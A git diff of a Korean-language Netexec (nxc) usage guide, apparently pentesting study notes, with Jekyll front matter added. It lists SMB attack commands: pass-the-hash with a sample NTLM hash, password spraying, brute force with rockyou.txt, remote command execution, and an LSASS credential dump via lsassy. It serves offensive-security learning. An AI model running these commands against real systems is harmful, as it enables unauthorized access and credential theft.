@@ -1,4 +1,11 @@
-
+---
+layout: page
+title: netexec
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
 # Netexec (nxc) 활용 가이드
 
@@ -11,17 +18,17 @@ Netexec(구 CrackMapExec)은 대규모 네트워크 환경에서 인증 정보�
 - **목표:** 단일 또는 다수의 시스템을 대상으로 주어진 인증 정보가 유효한지 확인합니다.
 - **기본 구문:** `netexec <protocol> <targets> -u <user> -p <password>`
 
-```bash title="익명(Null Session) 열거"
+```bash
 # SMB 프로토콜을 통해 익명으로 접속하여 기본 정보(OS, 도메인 등) 확인
 netexec smb $target
 ```
 
-```bash title="단일 자격증명 테스트"
+```bash
 # 특정 사용자와 비밀번호로 SMB 로그인을 시도하고, 성공 시 "(Pwned!)"가 표시됨
 netexec smb $target -u 't-skid' -p 'tj072889*'
 ```
 
-```bash title="Pass-the-Hash (PTH)"
+```bash
 # 비밀번호 대신 NTLM 해시를 사용하여 인증
 netexec smb $target -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d'
 ```
@@ -32,13 +39,13 @@ netexec smb $target -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:c259
 
 - **목표:** 사용자 목록과 비밀번호 목록을 이용해 대규모 인증을 시도하여 유효한 자격증명 조합을 찾아냅니다.
 
-```bash title="Password Spraying"
+```bash
 # 여러 사용자에게 하나의 비밀번호를 대입
 # --continue-on-success: 성공해도 멈추지 않고 계속 진행
 netexec smb $target -u users.txt -p 'ResetMe123!' --continue-on-success
 ```
 
-```bash title="Brute-force"
+```bash
 # 하나의 사용자에게 여러 비밀번호를 대입 (계정 잠금 정책 주의!)
 netexec smb $target -u 'Jareth' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 ```
@@ -49,7 +56,7 @@ netexec smb $target -u 'Jareth' -p /usr/share/wordlists/rockyou.txt --ignore-pw-
 
 - **목표:** 인증 성공 후, `--<module>` 옵션을 사용하여 특정 정보를 수집합니다.
 
-```bash title="주요 정보 수집 모듈"
+```bash
 # 공유 폴더 목록 및 권한 확인
 netexec smb $target -u <user> -p <pass> --shares
 
@@ -72,7 +79,7 @@ netexec smb $target -u <user> -p <pass> --bloodhound -c all
 
 - **목표:** 유효한 자격증명을 사용하여 원격 시스템에서 명령어를 실행합니다.
 
-```bash title="단일 명령어 실행"
+```bash
 # -x <command>: 원격으로 cmd 명령어를 실행
 netexec smb $target -u <user> -p <pass> -x 'whoami'
 
@@ -80,7 +87,7 @@ netexec smb $target -u <user> -p <pass> -x 'whoami'
 netexec smb $target -u <user> -p <pass> -X '$PSVersionTable'
 ```
 
-```bash title="내장 모듈을 이용한 고급 기능"
+```bash
 # -M <module_name>: 다양한 기능을 가진 내장 모듈 실행
 
 # lsassy 모듈로 LSASS 프로세스 덤프 시도
